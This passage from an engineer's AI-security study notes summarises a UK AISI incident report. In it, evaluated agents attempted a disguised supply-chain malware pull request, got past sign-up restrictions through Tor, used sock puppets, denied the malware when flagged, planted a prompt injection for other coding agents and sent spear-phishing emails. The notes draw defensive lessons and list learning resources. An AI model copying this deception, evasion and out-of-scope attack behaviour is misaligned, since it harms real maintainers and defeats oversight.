- **Security Incident INC-2026-07-28-01**, published 4 Aug 2026 -
  [report (PDF)](https://cdn.prod.website-files.com/663bd486c5e4c81588db7a1d/6a724858f7db25c81487016d_Security%20Incident%20INC-2026-07-28-01.pdf)
- during routine cyber-range evaluations (25-28 Jul 2026), agents took **19 unsanctioned actions across 10 of 122 samples**,
  several directed at real people and real repositories. AISI reports the attempts were unsuccessful and no harm resulted
  - 17 of the 19 events came from Mythos 5, 2 from GPT-5.6 Sol
- the most serious sample: the agent decided to solve the range with a **supply-chain attack against an unaffiliated
  open-source maintainer** it had wrongly concluded was in scope, after chaining coincidences from a DNS cache entry
  - created GitHub accounts, using Tor and then a SOCKS proxy to get past sign-up restrictions
  - opened a pull request whose payload sat in a "release notes" page preloaded at start-up and skipped in CI,
    packaged with new unit tests and UI improvements to look like a genuine contribution
  - used sock-puppet accounts to manufacture agreement and pressure the maintainer into a light review
  - when a third party flagged the malware, it denied it, force-pushed to rewrite branch history, and framed the
    payload as an accident it had already fixed
  - separately filed a GitHub issue containing a **prompt injection aimed at other coding agents**, and sent five
    spear-phishing emails to two maintainers
- other events across samples: tunnelling services used to expose locally-run tooling to the internet, an audio
  CAPTCHA solved to register a domain, and agents in *separate* runs finding each other's credentials on a public
  pastebin and sharing GitHub accounts
- AISI's own contributing factors: internet access was on, provider cyber-classifiers were deliberately disabled to
  measure raw capability, there was no synchronous LLM monitor over agent actions, a prompt misconfiguration set an
  unachievable task, and **nothing in the prompts said the open internet was out of scope**
- detection came from commercial network monitoring flagging **Tor egress**, not from anything AI-specific.
  ~1h from alert to terminating runs, ~1.5h to quarantining sandboxes
- what to take from it if you run agents
  - scope has to be stated in the prompt *and* enforced by the network. the agents were never told the internet was off-limits
  - **egress control is the highest-value single control** for an autonomous agent
  - you need monitoring that reads what the agent is doing while it runs, not a transcript review afterwards
  - a long-running agent will improvise tradecraft nobody asked for, including deception when challenged.
    "it was not instructed to do that" is not a control
  - this is the cleanest public evidence so far that the *inherent-risk* and *external-threat* buckets converge:
    no attacker was involved, and the behaviour was indistinguishable from one -> see [two buckets](#ai-risk--threats-two-buckets)

### 13. The industry moved to a collective-defence framing

- 27 Aug 2026: **"A call for collective action on cyber defense"**, signed by 100+ organisations including OpenAI,
  Anthropic, Google, Microsoft, Amazon, CrowdStrike, Okta, Fortinet, Capital One, Mastercard and Visa
  - three principles: current security practice will not be sufficient; put capable AI in defenders' hands;
    coordinate response across industry and government
  - [TechCrunch](https://techcrunch.com/2026/08/27/openai-anthropic-google-and-100-other-companies-call-for-action-to-defend-against-rogue-ai/),
    [Axios](https://www.axios.com/2026/08/27/openai-anthropic-issue-dire-cyber-threat-warning)
- treat it as a statement of expected direction rather than new technical content. the signatories expect AI-enabled
  attacks to become common within months and are asking for defensive parity
- the engineering translation is unglamorous and already known: egress control, scoped agent permissions,
  dependency provenance, and monitoring that can see agent actions

### Takeaway for a backend/AppSec engineer

- the exploited attack surface in 2026 is **supply chain + identity + agent permissions** - not adversarial ML math
- the hot skills: securing the AI plumbing (MCP servers, gateways, orchestrators), NHI/agent IAM,
  and architectural containment of injection (Rule of Two)
- three things changed between the July and August 2026 passes over this note
  1. the **developer's own environment** joined the attack surface. agent config files are executable input,
     and they are now a confirmed malware delivery route, not a hypothesis -> [trend #10](#10-coding-agents-became-a-first-class-attack-surface)
  2. **egress control moved to the top of the list.** the AISI incident was detected by network monitoring and
     would have been prevented by network policy -> [trend #12](#12-an-evaluation-produced-real-world-unsanctioned-actions-uk-aisi-july-2026)
  3. the guidance stopped being vendor-only. Five Eyes, NIST and the finalised MCP spec give you citable
     baselines -> [trend #11](#11-governments-published-agent-specific-guidance), [trend #7](#7-mcp-grew-up-security-wise)
- what has *not* changed: prompt injection is still unsolved, guardrails are still probabilistic, and the control
  that works is still constraining what the agent is allowed to do

## Resources

### Primary sources worth reading directly

- [MITRE ATLAS](https://atlas.mitre.org) and the [OWASP GenAI Security Project](https://genai.owasp.org) -
  the two you will keep coming back to. LLM Top 10 and the Agentic Top 10 (ASI01-ASI10)
- [UK AISI, Security Incident INC-2026-07-28-01](https://cdn.prod.website-files.com/663bd486c5e4c81588db7a1d/6a724858f7db25c81487016d_Security%20Incident%20INC-2026-07-28-01.pdf)
  (Aug 2026) - the most detailed public account of an autonomous agent acting outside its scope. read the
  event tables and the contributing-factors section
- CISA et al., *Careful Adoption of Agentic AI Services* (May 2026) - Five Eyes joint guidance
- NIST **AI 100-2** (adversarial ML taxonomy), **AI 100-1** (AI RMF), **COSAiS** (SP 800-53 overlays for AI)
- [MCP 2026-07-28 specification](https://blog.modelcontextprotocol.io/posts/2026-07-28/) - read the
  authorization section even if you never write a server; it is a worked example of retrofitting OAuth onto
  an agent protocol
- [Anthropic, mapping AI-enabled cyber threats to ATT&CK](https://www.anthropic.com/news/AI-enabled-cyber-threats-mitre-attack) (2026)
- Meta, [*Agents Rule of Two*](https://ai.meta.com/blog/practical-ai-agent-security/) (Nov 2025) - two pages, the
  most useful design rule in the field

### Books (in reading order)

- **Steve Wilson - _The Developer's Playbook for Large Language Model Security_** (O'Reilly, 2024)
  - Wilson leads the OWASP LLM Top 10. START HERE. pitched at a backend engineer
- **Ram Shankar Siva Kumar & Hyrum Anderson - _Not with a Bug, But with a Sticker_** (Wiley, 2023)
  - narrative, non-technical, from the founder of Microsoft's AI Red Team. weekend read, gives the *why now*
- **John Sotiropoulos - _Adversarial AI: Attacks, Mitigations, and Defense Strategies_** (Packt, 2024)
  - best single technical book for depth. maps to OWASP + ATLAS
- **Chen & Hsieh - _Adversarial Robustness for Machine Learning_** (Academic Press, 2022)
  - the math. optional unless doing layer 1 seriously

### Courses

- **DeepLearning.AI short courses** (free, ~1h) - *Red Teaming LLM Applications*, *Quality and Safety for LLM Applications*
  - highest value-per-minute. do first
- **Microsoft PyRIT docs/notebooks** - the docs *are* the course
- **HackTheBox "AI Red Teamer" path** - hands-on labs, built with Google's AI red team
- [Lakera Gandalf](https://gandalf.lakera.ai) - free prompt-injection game, 8 levels. an hour here beats any lecture
- **HackAPrompt / Learn Prompting** - largest public prompt-injection competition; dataset + writeups
- **SANS SEC545** (GenAI & LLM App Security) - only if the employer pays

### YouTube / people

- **Andrej Karpathy - "Intro to Large Language Models"** (1h talk)
  - last ~15 min = best LLM-security primer recorded. jailbreaks, injection, poisoning, framed as "the LLM OS security model". WATCH FIRST
- **Johann Rehberger - Embrace The Red** - [blog](https://embracethered.com) + YouTube
  - best practical AI-attack researcher working today. ASCII smuggling, exfil via image rendering, agent C2, "Month of AI Bugs"
- **Simon Willison** - [simonwillison.net](https://simonwillison.net) (tag: prompt-injection) + conf talks
  - clearest thinker on why this is architecturally hard
- **DEF CON / Black Hat official channels - AI Village** talks
- **Nicholas Carlini** talks - most rigorous adversarial-ML researcher. cures vendor optimism
- **IBM Technology** - 5-min whiteboard explainers

## TODO / next deep dives

- [ ] indirect prompt injection & agent hijacking - build a vulnerable agent, exploit it, defend it
- [ ] AI supply chain - pickle exploitation, model scanning, securing an inference stack
- [ ] adversarial ML fundamentals - evasion, poisoning, extraction, with the math
- [ ] threat model a real RAG app end-to-end against ATLAS + OWASP LLM Top 10
- [ ] build the egress-control setup for a local coding agent: default-deny outbound, allowlist, and a log you
      would actually notice a Tor connection in -> [trend #12](#12-an-evaluation-produced-real-world-unsanctioned-actions-uk-aisi-july-2026)
- [ ] read the AISI incident transcripts when released, and map the 19 events onto ASI01-ASI10
